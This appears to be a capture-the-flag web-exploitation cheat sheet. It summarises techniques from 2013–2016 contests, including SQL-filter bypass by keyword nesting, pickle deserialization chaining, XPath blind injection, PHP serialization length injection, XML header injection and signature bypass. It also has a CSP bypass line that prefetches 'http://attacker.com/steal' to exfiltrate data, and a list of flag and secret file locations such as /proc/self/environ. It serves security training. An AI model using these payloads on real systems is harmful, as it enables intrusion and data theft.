Deobfuscate client-side JS to extract hardcoded HMAC secret, then forge signatures for arbitrary requests via browser console. See [client-side-advanced.md](client-side-advanced.md#client-side-hmac-bypass-via-leaked-js-secret-codegate-2013).

## SQLi Keyword Fragmentation Bypass (SecuInside 2013)

Single-pass `preg_replace()` keyword filters bypassed by nesting the stripped keyword inside the payload: `unload_fileon` → `union` after `load_file` removal. See [server-side-exec-2.md](server-side-exec-2.md#sqli-keyword-fragmentation-bypass-secuinside-2013).

## Pickle Chaining via STOP Opcode Stripping (VolgaCTF 2013)

Strip pickle STOP opcode (`\x2e`) from first payload, concatenate second — both `__reduce__` calls execute in single `pickle.loads()`. Chain `os.dup2()` for socket output. See [server-side-deser.md](server-side-deser.md#pickle-chaining-via-stop-opcode-stripping-volgactf-2013).

## XPath Blind Injection (BaltCTF 2013)

`substring(normalize-space(../../../node()),1,1)='a'` — boolean-based blind extraction from XML data stores via response length oracle. See [server-side-exec.md](server-side-exec.md#xpath-blind-injection-baltctf-2013).

## SQLite File Path Traversal to Bypass String Equality (Codegate 2013)

Input `/../gamesim_GM` fails `== "GM"` string check but filesystem normalizes `/var/game_db/gamesim_/../gamesim_GM.db` to the blocked path. See [server-side-advanced-2.md](server-side-advanced-2.md#sqlite-file-path-traversal-to-bypass-string-equality-codegate-2013).

## PHP Serialization Length Manipulation via Filter Word Expansion (0CTF 2016)

Post-serialization string filter replaces "where" (5 chars) with "hacker" (6 chars). Repeat "where" N times so expansion overflows by exactly enough bytes to inject a serialized field (`";}s:5:"photo";s:10:"config.php";}`). See [server-side-deser.md](server-side-deser.md#php-serialization-length-manipulation-via-filter-word-expansion-0ctf-2016).

## CSP Bypass via link prefetch (Boston Key Party 2016)

`<link rel="prefetch" href="http://attacker.com/steal">` not blocked by CSP `script-src`. Also: `<meta http-equiv="refresh">`. Scriptless data exfiltration. See [client-side-advanced.md](client-side-advanced.md#csp-bypass-via-link-prefetch-boston-key-party-2016).

## XML Injection via X-Forwarded-For Header (Pwn2Win 2016)

Server builds XML from headers without escaping. Inject `</ip><admin>true</admin><ip>` via X-Forwarded-For; first-tag-wins XML parsing. See [server-side.md](server-side-2.md#xml-injection-via-x-forwarded-for-header-pwn2win-2016).

## Base64 Decode Leniency and Parameter Override for Signature Bypass (BCTF 2016)

`b64decode()` silently ignores non-base64 chars. Append `&price=0` after signature -- b64decode strips it, but parameter parser processes it (last value wins). See [auth-infra.md](auth-infra.md#base64-decode-leniency-and-parameter-override-for-signature-bypass-bctf-2016).

## Common Flag Locations

Files: `/flag.txt`, `/flag`, `/app/flag.txt`, `/home/*/flag*`. Env: `/proc/self/environ`. DB: `flag`, `flags`, `secret` tables. Headers: `x-flag`, `x-archive-tag`, `x-proof`. DOM: `display:none` elements, `data-*` attributes.
